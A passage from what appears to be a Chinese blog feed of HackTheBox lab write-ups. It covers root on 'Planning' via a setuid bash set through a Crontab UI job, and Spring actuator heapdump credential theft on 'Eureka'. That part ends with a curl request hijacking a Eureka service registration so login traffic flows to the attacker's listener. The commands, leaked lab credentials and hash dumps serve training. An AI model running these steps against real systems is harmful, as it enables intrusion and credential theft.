/usr/lib/openssh/ssh-keysign\n-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 39K Dec  5 02:26 /usr/bin/umount  --->  BSD/Linux(08-1996)\n-rwsr-xr-x 1 root root 51K Dec  5 02:26 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\n-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable\n-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)\n-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh\n-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20\n-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10\n-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3\n-rwsr-xr-x 1 root root 55K Dec  5 02:26 /usr/bin/su\n-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 1.4M May 11 04:23 /tmp/bash\n```\n\n```bash\n╔══════════╣ Active Ports\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:37777         0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -\ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\n```\n\n注意到很多只有本机开放的端口，3000 是 Grafana，`8000` 不清楚\n\n将 `8000`端口转发出去\n\n```bash\nenzo@planning:/tmp$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &\n[1] 2124\n```\n\n需要账号密码，`enzo`的凭据不正确\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image8.png)\n\n回到 enzo 中再寻找一下信息\n\n在 `/opt/crontabs` 找到 `crontab.db`  \n\n```bash\nenzo@planning:/opt/crontabs$ cat crontab.db \n{\"name\":\"Grafana backup\",\"command\":\"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz\",\"schedule\":\"@daily\",\"stopped\":false,\"timestamp\":\"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740774983276,\"saved\":false,\"_id\":\"GTI22PpoJNtRKg0W\"}\n{\"name\":\"Cleanup\",\"command\":\"/root/scripts/cleanup.sh\",\"schedule\":\"* * * * *\",\"stopped\":false,\"timestamp\":\"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\",\"logging\":\"false\",\"mailing\":{},\"created\":1740849309992,\"saved\":false,\"_id\":\"gNIRXh1WIc9K7BYX\"}\n```\n\n这些是计划任务\n\n```bash\n# Grafana Docker 镜像备份，每天 00:00 执行\n0 0 * * * root /usr/bin/docker save root_grafana -o /var/backups/grafana.tar \\\n  && /usr/bin/gzip /var/backups/grafana.tar \\\n  && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \\\n  && rm /var/backups/grafana.tar.gz\n```\n\n```bash\n# 每分钟运行一次清理脚本\n* * * * * root /root/scripts/cleanup.sh\n```\n\n其中 `Grafana Docker` 计划任务中能得到一个密码 `P4ssw0rdS0pRi0T3c`\n\n我们到 `Web` 上尝试使用该密码进行登录，最后使用 `root:P4ssw0rdS0pRi0T3c` 成功进入后台\n\n### Crontab 提权\n\n后台是 `Crontab UI`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image9.png)\n\n我们看到上面的计划任务是以 `root` 执行的，然后我们可以在这里新建计划任务（这里方法很多了，随便 root）\n\n直接进行反弹 `shell` （失败）\n\n给 `/bin/bash` 设置 `sid`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image10.png)\n\n获取 Root\n\n```bash\nenzo@planning:/opt/crontabs$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash\nenzo@planning:/opt/crontabs$ /bin/bash -p\nbash-5.2# id\nuid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)\nbash-5.2# cd /root\nbash-5.2# ls\nroot.txt  scripts\nbash-5.2# cat root.txt \n4f1ad996a454ef10623bfb578c0134ba\n```\n\n## 总结\n\n打的糊里糊涂的，并不算难。但是凭据放在 **Machine Information** 里面我是真想不到…\n\n每个点都感觉没有串联起来，割裂感严重。",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning",
            "title": "HackTheBox - Machine - Planning",
            "summary": "Machine Planning https://app.hackthebox.com/machines/Planning | Esay 前期踩点 收集到一个邮箱 info@planning.htb Web 渗透 信息收集 访问 HTTP 服务，采集指纹 可能有用的三个用户名 Bob Moss Ro...",
            "date_modified": "2025-05-11T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux靶机",
                "Grafana",
                "Crontab"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka",
            "content_html": "# Machine - Eureka\n\n> https://app.hackthebox.com/machines/Eureka | `Hard`\n> \n\nPS：尤里卡发动！所有奇观建造提速 30% !\n\n## 前期踩点\n\n```bash\n➜  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT\nNmap scan report for 10.10.11.66\nHost is up (0.15s latency).\nNot shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n```\n\n```bash\n➜  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT\nNmap scan report for eureka.htb (10.10.11.66)\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\n|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)\n|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://furni.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   442.32 ms 10.10.16.1\n2   139.60 ms eureka.htb (10.10.11.66)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.95 seconds\n```\n\n## Web 渗透\n\n### 信息收集\n\nWhatWeb\n\n```bash\n➜  Eureka whatweb furni.htb                                                                             \nhttp://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image.png)\n\n页面上的一些操作要进行登陆后才能进行操作\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image1.png)\n\n抓个包分析一下框架\n\n```bash\n➜  Eureka curl -i http://furni.htb                                                                                                                                                                                                  \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nServer: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       \nDate: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 \nContent-Type: text/html;charset=UTF-8                                                                                                                                                                                               \nTransfer-Encoding: chunked                                                                                                                                                                                                          \nConnection: keep-alive                                                                                                                                                                                                              \nVary: Origin                                                                                                                                                                                                                        \nVary: Access-Control-Request-Method                                                                                                                                                                                                 \nVary: Access-Control-Request-Headers                                                                                                                                                                                                \nX-Content-Type-Options: nosniff\nX-XSS-Protection: 0\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\nPragma: no-cache\nExpires: 0\nX-Frame-Options: DENY\nContent-Language: en-US\n```\n\n**nginx** 是前端 Web Server（反代或直接服务）。\n\n**Content-Type 是 text/html;charset=UTF-8**，一般就是标准网页。\n\n**X-Content-Type-Options: nosniff** 和 **X-Frame-Options: DENY** 这些是常见的安全 HTTP 头，一般 Java、Spring Boot、或者 ASP.NET Core 这种现代后端框架会加上这些头。\n\n**Cache-Control: no-cache, no-store, max-age=0, must-revalidate**，这种强制禁止缓存的策略，也常见于 **Spring Boot**，尤其是默认模板生成的网站。\n\n再加上 `Content-Language: en-US`，和 `Pragma: no-cache` 这种写法，也很像 Java 系列应用。\n\n**所以，综合来看，后端很可能是 Java 系的框架，极有可能是**：**Spring Boot**\n\n---\n\n目录扫描也确定了这一点，扫描出来了`/actuator` 目录，并且返回 200\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image2.png)\n\n### Spring acturtor 未授权\n\n存在未授权访问\n\n```bash\ncurl http://furni.htb/actuator/env\n```\n\n能发现网站根目录：`/var/www/web/Furni`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image3.png)\n\n并且目录扫描中还从扫描出来了 `/actuator/heapdump` （`Heap dump` 为渗透测试者提供了对内存中所有对象的可视化访问，是发现和验证敏感信息泄露、业务逻辑缺陷及内存破坏漏洞的重要手段。）\n\n```bash\n[03:08:56] 200 -   76MB - /actuator/heapdump\n```\n\n```bash\n➜  Eureka curl http://furni.htb/actuator/heapdump --output heapdump \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k\n```\n\n使用 工具对其进行分析\n\n```bash\n➜  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                       \n===========================================                                                                                                                                                                                         \nSpringDataSourceProperties\n-------------\npassword = 0sc@r190_S0l!dP@sswd\ndriverClassName = com.mysql.cj.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nusername = oscar190\n===========================================\nHikariDataSource\n-------------\njava.lang.NumberFormatException: Cannot parse null string \n===========================================\nOriginTrackedMapPropertySource\n-------------                  \nmanagement.endpoints.web.exposure.include = *\nspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\nspring.cloud.inetutils.ignoredInterfaces = enp0s.*\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\nserver.forward-headers-strategy = native   \nspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nspring.application.name = Furni\nserver.port = 8082\nspring.jpa.properties.hibernate.format_sql = true\nspring.session.store-type = jdbc           \nspring.jpa.hibernate.ddl-auto = none\n-------------                                                \nUserPassSearcher                           \n.... many Message ....\n```\n\n喂给GPT上进行分析，其中最关键的信息是：\n\n```bash\nusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n```\n\n| 配置项 | 含义 | 安全影响／风险 |\n| --- | --- | --- |\n| `management.endpoints.web.exposure.include = *` | Actuator 暴露所有管理端点（包括 `/heapdump`, `/env`, `/beans` 等） | **高危**：攻击者可访问任意管理端点，下载堆快照、查看环境变量、动态修改日志级别，甚至执行敏感操作。 |\n| `spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver` | JDBC 驱动类，使用 MySQL Connector/J | 无直接风险，但表明后续 URL、凭据可用于 MySQL 连接。 |\n| `spring.cloud.inetutils.ignoredInterfaces = enp0s.*` | Spring Cloud InetUtils 忽略以 `enp0s.*` 命名的网络接口 | 较低风险；影响服务注册时记录的 IP，与实际可达 IP 可能不一致。 |\n| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka 客户端注册中心地址，包含明文用户名和密码 | **高危**：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。 |\n| `server.forward-headers-strategy = native` | 代理环境下转发 HTTP 头（如 X-Forwarded-*） | 较低风险；可能影响日志中记录的真实客户端 IP，但对渗透价值有限。 |\n| `spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB` | JDBC 连接 URL，指向本地 MySQL 数据库 | 已结合凭据可直接连接数据库，若数据库允许运行外部连接，可远程利用。 |\n| `spring.application.name = Furni` | 应用在 Eureka 或其他注册中心中的名称 | 低风险；可用于识别服务拓扑，但对攻击无直接帮助。 |\n| `server.port = 8082` | 应用监听的 HTTP 端口 | 揭示可访问的端口，渗透测试时可针对该端口进行探测与攻击。 |\n| `spring.jpa.properties.hibernate.format_sql = true` | Hibernate 打印 SQL 时格式化输出 | 低风险；仅影响日志可读性，无安全影响。 |\n| `spring.session.store-type = jdbc` | Spring Session 存储策略，表示会话数据存入数据库 | 中等风险：会话信息、Session ID 存库，攻击者可尝试读取或篡改会话表以进行会话固定或劫持。 |\n| `spring.jpa.hibernate.ddl-auto = none` | Hibernate 不会自动创建、更新或验证数据库结构 | 低风险；表示应用不会修改表结构。 |\n\n### Spring Eureka\n\nSpring Eureka 是一个服务注册中心，是用来实现微服务之间**自动注册和发现**的工具\n\n分析中发现，账号密码也展示出来了 `EurekaSrvr:0scarPWDisTheB3st`\n\n| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka 客户端注册中心地址，包含明文用户名和密码 | **高危**：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。 |\n| --- | --- | --- |\n\n能发现服务器在好几个端口运行着服务\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image4.png)\n\n## 提权 - To Miranda\n\n### 信息收集\n\n之前上面还发现呢一组账号密码`oscar190:0sc@r190_S0l!dP@sswd`\n\n尝试 SSH 登录，发现成功了\n\n```bash\n➜  Eureka ssh oscar190@10.10.11.66\nThe authenticity of host '10.10.11.66 (10.10.11.66)' can't be established.\nED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.66' (ED25519) to the list of known hosts.\noscar190@10.10.11.66's password: \n\nLast login: Sun Apr 27 07:31:27 2025 from 10.10.16.59\noscar190@eureka:~$ \n```\n\n用户信息\n\n```bash\noscar190@eureka:/home$ ls\nmiranda-wise  oscar190\n```\n\n监听的端口\n\n```bash\noscar190@eureka:~$ ss -tulpn\nNetid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 \nudp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            \nudp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            \ntcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            \ntcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            \ntcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  \n```\n\n结合之前的信息，我们去访问一下数据库\n\n```bash\nusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n```\n\n```bash\noscar190@eureka:/home$ mysql -uoscar190 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 400\nServer version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> \n```\n\n```bash\nariaDB [Furni_WebApp_DB]> select * from SPRING_SESSION;                                                                                                                                                                            \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 \n| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ \n| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 \n| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  \n| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |\n| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |\n```\n\n```bash\nMariaDB [Furni_WebApp_DB]> select * from users;\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n| id | first_name | last_name | email                   | password                                                     | is_staff |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10$J4yap5ZxviliZO9jBCuSdeD.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |\n|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10$DgUDWpxipW2Yt7UcKxzvweB7FXoV/LFxlJG8yuL56NyUMMLr5uBuK |        0 |\n|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10$3LDYl5QEt4K4u8vLWMGH8eDA/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |\n|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10$4TLCSlEfYrNDFfPDQ5z4p.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |\n|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |\n| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |\n| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |\n| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10$J93xmU0.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |\n| 15 | test       | test      | test@test.com           | $2a$10$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR.toEjh63rbQWG |        0 |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n9 rows in set (0.000 sec)\n```\n\n将密码放后台进行爆破\n\n然后上传 `pspy64` 监测一下后台，发现 `/opt/log_analyse.sh` 和 `/opt/scripts/miranda-Login-Simulator.sh` 两个脚本，第二个脚本应该是模拟`miranda`用户登录Web然后在数据库中留下`SESSION`\n\n```bash\n2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           \n2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac\nhe-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t\nmp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         \n2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  \n2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  \n```\n\n那么就是说在一定时间会运行该脚本，并且携带`miranda`的账户密码去进行登录。\n\n现在我们应该去通过某种方式去获得数据包\n\n### Spring Eureka 截取流量\n\n佬们分享了一篇文章：https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539\n\n其中就有关于**流量劫持**的，大致就是：攻击者将注册 ***webservice*** 实例并将其指向恶意服务器，或者替换掉原本的实例，在靶机中可能是 **USER-MANAGEMENT-SERVICE**\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image5.png)\n\n从 `heapdump` 中导出的数据中\n\n```bash\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\n```\n\n可以知道 Eureka Client，默认要连接的 Eureka Server 地址是 `http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`，而且访问时要用账号密码认证。\n\n需要使用本地地址进行访问，那么就要用 `SSH` 将端口转发出来\n\n```bash\nssh -L 8761:localhost:8761 oscar190@10.10.11.66\n```\n\n`kali`监听端口\n\n```bash\n➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\n```\n\n然后查看 `/eureka/apps/USER-MANAGEMENT-SERVICE` 原本的内容\n\n```bash\n➜  Eureka curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H \"Accept: application/json\"\n```\n\n```bash\n{\n  \"application\": {\n    \"name\": \"USER-MANAGEMENT-SERVICE\",\n    \"instance\": [\n      {\n        \"instanceId\": \"192.168.40.130:user-management-service:6969\",\n        \"hostName\": \"192.168.40.130\",\n        \"app\": \"USER-MANAGEMENT-SERVICE\",\n        \"ipAddr\": \"192.168.40.130\",\n        \"status\": \"UP\",\n        \"overriddenStatus\": \"UNKNOWN\",\n        \"port\": {\n          \"$\": 6969,\n          \"@enabled\": \"true\"\n        },\n        \"securePort\": {\n          \"$\": 9443,\n          \"@enabled\": \"false\"\n        },\n        \"countryId\": 1,\n        \"dataCenterInfo\": {\n          \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n          \"name\": \"MyOwn\"\n        },\n        \"leaseInfo\": {\n          \"renewalIntervalInSecs\": 30,\n          \"durationInSecs\": 90,\n          \"registrationTimestamp\": 1745749189827,\n          \"lastRenewalTimestamp\": 1745749189827,\n          \"evictionTimestamp\": 0,\n          \"serviceUpTimestamp\": 1745749189827\n        },\n        \"metadata\": {\n          \"zone\": \"default\",\n          \"management.port\": \"6969\"\n        },\n        \"homePageUrl\": \"http://192.168.40.130:6969/\",\n        \"statusPageUrl\": \"http://192.168.40.130:6969/info\",\n        \"healthCheckUrl\": \"http://192.168.40.130:6969/health\",\n        \"secureHealthCheckUrl\": \"\",\n        \"vipAddress\": \"user-management-service\",\n        \"secureVipAddress\": \"user-management-service\",\n        \"isCoordinatingDiscoveryServer\": \"false\",\n        \"lastUpdatedTimestamp\": \"1745749189827\",\n        \"lastDirtyTimestamp\": \"1745750384661\",\n        \"actionType\": \"ADDED\"\n      },\n      {\n        \"instanceId\": \"localhost:USER-MANAGEMENT-SERVICE:8081\",\n        \"hostName\": \"localhost\",\n        \"app\": \"USER-MANAGEMENT-SERVICE\",\n        \"ipAddr\": \"10.10.11.66\",\n        \"status\": \"UP\",\n        \"overriddenStatus\": \"UNKNOWN\",\n        \"port\": {\n          \"$\": 8081,\n          \"@enabled\": \"true\"\n        },\n        \"securePort\": {\n          \"$\": 443,\n          \"@enabled\": \"false\"\n        },\n        \"countryId\": 1,\n        \"dataCenterInfo\": {\n          \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n          \"name\": \"MyOwn\"\n        },\n        \"leaseInfo\": {\n          \"renewalIntervalInSecs\": 30,\n          \"durationInSecs\": 90,\n          \"registrationTimestamp\": 1745747961808,\n          \"lastRenewalTimestamp\": 1745755807954,\n          \"evictionTimestamp\": 0,\n          \"serviceUpTimestamp\": 1745747961808\n        },\n        \"metadata\": {\n          \"management.port\": \"8081\"\n        },\n        \"homePageUrl\": \"http://localhost:8081/\",\n        \"statusPageUrl\": \"http://localhost:8081/actuator/info\",\n        \"healthCheckUrl\": \"http://localhost:8081/actuator/health\",\n        \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n        \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n        \"isCoordinatingDiscoveryServer\": \"false\",\n        \"lastUpdatedTimestamp\": \"1745747961808\",\n        \"lastDirtyTimestamp\": \"1745747961026\",\n        \"actionType\": \"ADDED\"\n      }\n    ]\n  }\n}\n\n```\n\n构造恶意数据包，不需要全部都添加，慢慢测试即可\n\n```bash\ncurl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H 'Content-Type: application/json' -d '{\n  \"instance\": {\n\t  \"hostName\": \"10.10.16.59\",\n    \"instanceId\": \"USER-MANAGEMENT-SERVICE\",\n    \"app\": \"USER-MANAGEMENT-SERVICE\",\n    \"ipAddr\": \"10.10.16.59\",\n    \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"dataCenterInfo\": {\n      \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n      \"name\": \"MyOwn\"\n    },\n    \"status\": \"UP\",\n    \"port\": {\n      \"$\": 8081,\n      \"@enabled\": \"true\"\n    }\n  }\n}'\n```\n\n然后我们的端口就会捕获到数据包\n\n```bash\n➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\nconnect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346\nPOST /login HTTP/1.1\nX-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1,127.0.0.1\nX-Forwarded-Proto: http,http\nContent-Length: 168\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nForwarded: proto=http;host=furni.htb;for=\"127.0.0.1:45412\"\nX-Forwarded-Port: 80\nX-Forwarded-Host: furni.htb\nhost: 